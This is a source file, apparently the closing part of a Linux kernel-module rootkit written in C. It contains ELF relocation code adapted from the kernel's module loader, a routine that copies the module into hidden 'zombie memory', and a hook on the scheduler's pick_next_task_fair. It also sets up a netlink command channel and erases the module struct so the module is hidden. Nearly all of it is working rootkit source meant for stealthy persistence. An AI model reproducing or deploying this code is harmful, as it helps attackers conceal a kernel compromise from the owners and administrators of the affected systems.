void reloc_rewrite_sections(Elf64_Ehdr *elf64_ehdr, Elf64_Shdr *sechdrs, char *secstrings) {
    unsigned int i;

    for (i = 1; i < elf64_ehdr->e_shnum; i++) {
        unsigned long sec_addr;
        if ((sec_addr = get_section_address(secstrings + sechdrs[i].sh_name))) {
            if ((strcmp(secstrings + sechdrs[i].sh_name, ".symtab") &&
                 strcmp(secstrings + sechdrs[i].sh_name, ".strtab"))) {
                /* If loaded in module, set to zombie memory address */
                sechdrs[i].sh_addr = sec_addr - (THIS_MODULE->core_layout.base - zombie_memory);
            } else {
                sechdrs[i].sh_addr = (size_t) elf64_ehdr + sechdrs[i].sh_offset;
            }
        } else {
            sechdrs[i].sh_addr = (size_t) elf64_ehdr + sechdrs[i].sh_offset;
        }
    }
}

/** reloc_resolve_symbols - resolves the symbols in the symbol table
 * @elf64_ehdr: Pointer to ELF header
 * @sechdrs: Pointer to section header table
 * @secstrings: Pointer to string section (contains the section names with 0 separators in between)
 *
 * Resolve the symbols of the ELF file and write them into the symbol entry in the ELF header in memory.
 *
 * Is based on functionality of Linux kernel: /kernel/module.c - simplify_symbols
 * https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/kernel/module.c?h=linux-4.9.y#n2213
 */
Elf64_Shdr *reloc_resolve_symbols(Elf64_Ehdr *elf64_ehdr, Elf64_Shdr *sechdrs, char *secstrings) {
    Elf64_Shdr *symtab = 0;
    Elf64_Shdr *strtab = 0;

    /* Determine location of symbol table and string table */
    for (int i = 1; i < elf64_ehdr->e_shnum; i++) {
        if (!strcmp(secstrings + sechdrs[i].sh_name, ".symtab")) {
            symtab = &sechdrs[i];
        }
        if (!strcmp(secstrings + sechdrs[i].sh_name, ".strtab")) {
            strtab = &sechdrs[i];
        }
    }

    /* Resolve the symbols in the symbol table */
    if (symtab && strtab) {
        /* Pointer to the symbol table, i.e. points to the first entry */
        Elf64_Sym *sym = (void *) symtab->sh_addr;
        for (int i = 1; i < symtab->sh_size / sizeof(Elf64_Sym); i++) {
            const char *name;
            unsigned long kernel_func_addr;
            switch (sym[i].st_shndx) {
                case SHN_COMMON:
                    break;
                case SHN_LIVEPATCH:
                    break;
                case SHN_ABS:
                    break;
                case SHN_UNDEF:
                    name = (void *) strtab->sh_addr + sym[i].st_name;
                    kernel_func_addr = kallsyms_lookup_name(name);
                    if (kernel_func_addr) {
                        sym[i].st_value = kernel_func_addr;
                        break;
                    } else if (!kernel_func_addr && ELF_ST_BIND(sym[i].st_info) == STB_WEAK) {
                        break;
                    } else {
                        log_print(LOG_ERR, "Symbol not found!");
                    }
                    break;
                default:
                    /* The address of the section with section index (st_shndx) is added to the value of the symbol
                     * (the offset into the section) */
                    sym[i].st_value += sechdrs[sym[i].st_shndx].sh_addr;
                    break;
            }
        }
        return symtab;
    } else {
        return NULL;
    }
}

/** reloc_perform_relocation - relocates the file
 * @elf64_ehdr: Pointer to ELF header
 * @sechdrs: Pointer to section header table
 * @secstrings: Pointer to string section (contains the section names with 0 separators in between)
 * @symtab: Pointer to the symbol table
 *
 * Takes the relocation sections of the file and applies the relocation according to their entries.
 *
 * Is based on functionality of Linux kernel:
 * /kernel/module.c - apply_relocations
 * https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/kernel/module.c?h=linux-4.9.y#n2280
 *
 * /arch/x86/kernel/module.c - apply_relocate_add
 * https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/arch/x86/kernel/module.c?h=linux-4.9.y#n140
 *
 * Unnecessary parts are omitted and it is adapted to the use case.
 */
void reloc_perform_relocation(Elf64_Ehdr *elf64_ehdr, Elf64_Shdr *sechdrs, char *secstrings, Elf64_Shdr *symtab) {
    /* NOTE: This loop is copied from the Linux Kernel:*/
    for (int i = 1; i < elf64_ehdr->e_shnum; i++) {
        unsigned int infosec = sechdrs[i].sh_info;

        /* Not a valid relocation section? */
        if (infosec >= elf64_ehdr->e_shnum)
            continue;

        /* Don't bother with non-allocated sections */
        if (!(sechdrs[infosec].sh_flags & SHF_ALLOC))
            continue;

        /* Livepatch relocation sections are applied by livepatch */
        if (sechdrs[i].sh_flags & SHF_RELA_LIVEPATCH)
            continue;

        if (sechdrs[i].sh_type == SHT_RELA) {
            long val;
            void *loc;
            unsigned int nr_rela_entries = (sechdrs[i].sh_size) / sizeof(Elf64_Rela);
            Elf64_Rela *rela = (void *) sechdrs[i].sh_addr;
            unsigned int k;

            for (k = 0; k < nr_rela_entries; k++) {
                /* Where to make change */
                loc = (void *) sechdrs[sechdrs[i].sh_info].sh_addr + rela[k].r_offset;
                /* Symbol it is referring to. All resolved */
                Elf64_Sym *sym = (Elf64_Sym *) symtab->sh_addr + ELF64_R_SYM(rela[k].r_info);
                /* Value of the symbol + addend */
                val = sym->st_value + rela[k].r_addend;
                switch (ELF64_R_TYPE(rela[k].r_info)) {
                    case R_X86_64_NONE:
                        break;
                    case R_X86_64_64:
                        *(unsigned long *) loc = val;
                        break;
                    case R_X86_64_32S:
                        *(unsigned int *) loc = val;
                        break;
                    case R_X86_64_PC32:
                        val -= (unsigned long) loc;
                        /* Leave the __fentry__ calls untouched since they are 0 normally and contain an offset
                         * if we change them.
                         * Not known yet where they are replaced by nops or where in the relocation process is
                         * defined that they are 0.
                         */
                        if (!((unsigned long) (loc + val + 4) == kallsyms_lookup_name("__fentry__"))) {
                            *(unsigned int *) loc = val;
                        }
                        break;
                    default:
                        break;
                }
            }
        }
    }
}
#endif
/* =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 * =-=-=-=-=-=-=-=-=-=-= END ZOMBIE ROOTKIT -=-=-=-=-=-=-=-=-=-=-=-=-=-=
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= */

/** rootkit_init - initialization routine of rootkit
 *
 * This function sets up the module/rootkit according to the settings in the header file.
 */
static int rootkit_init(void) {

    /* Zombie rootkit */
#ifdef ZOMBIE_HIDE
    if(!mod_elf_path || !mod_elf_size) {
        log_print(LOG_ERR, "ELF module file path and size not specified, abort..");
        return -1;
    }
    /* Create the zombie rootkit, i.e. allocate memory, copy module code and perform relocation */
    zombie_create();
#endif

    /* Hook adjustment for zombie rootkit */
#ifndef MANUAL_MODE
#ifdef ZOMBIE_HIDE
    /* Sets the address of the function to be called to the one in the zombie memory */
    *((unsigned long *) get_zombie_address((void *) &hooked_pick_next_function.function)) = (unsigned long) get_zombie_address((void *) fh_pick_next_task_fair);
#endif
#endif

    /* Install hook */
#ifndef MANUAL_MODE
#ifdef ZOMBIE_HIDE
    fh_install_hook(get_zombie_address((void *) &hooked_pick_next_function));
#else
    fh_install_hook(&hooked_pick_next_function);
#endif
#endif

    /* Netlink socket configuration structure.
     * Config struct to pass to socket creation function.
     * Specifies callback function, where the main work is done. */
    struct netlink_kernel_cfg cfg = {
#ifdef ZOMBIE_HIDE
            .input = get_zombie_address((void *) &user_netlink_rcv_msg)
#else
            .input = user_netlink_rcv_msg,
#endif
    };

    /* Netlink socket creation
     * Create the socket in the kernel and register callback function specified in cfg
     * Note that the this works only one time in zombie memory, the first time the rootkit is run.
     * For more runs, the netlink_kernel_create returns 0. */
#ifdef ZOMBIE_HIDE
    /* Set the socket address in the zombie memory */
    *((struct sock **)(get_zombie_address((void *) &nlsock))) = __netlink_kernel_create(&init_net, NETLINK_USER, get_zombie_address((void *) &__this_module), &cfg);
#else
    nlsock = netlink_kernel_create(&init_net, NETLINK_USER, &cfg);
#endif


    /* Hide module struct for zombie hiding */
#ifdef ZOMBIE_HIDE
    /* Set the area where the struct module is stored in zombie memory to 1s */
    unsigned long this_mod = get_section_address(".gnu.linkonce.this_module");
    void *zom_this_mod = get_zombie_address((void *) this_mod);
    memset(zom_this_mod, 0, sizeof(struct module));
    void *refcnt = get_zombie_address(&THIS_MODULE->refcnt);
    *((int *) refcnt) = 1;
#endif

    /* Initialization routine return */
#ifdef ZOMBIE_HIDE
    /* Return error (-1) for zombie rootkit to unload the module */
    return -1;
#else
    return 0;
#endif
}

/** rootkit_exit - exit routine of the rootkit
 *
 * Cleans up structures. Only applicable for manual mode.
 */
static void rootkit_exit(void) {
#ifndef MANUAL_MODE
    fh_remove_hook(&hooked_pick_next_function);
#endif
#ifdef MANUAL_MODE
    netlink_kernel_release(nlsock);
#endif
    log_print(LOG_INFO, "Exit rootkit");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
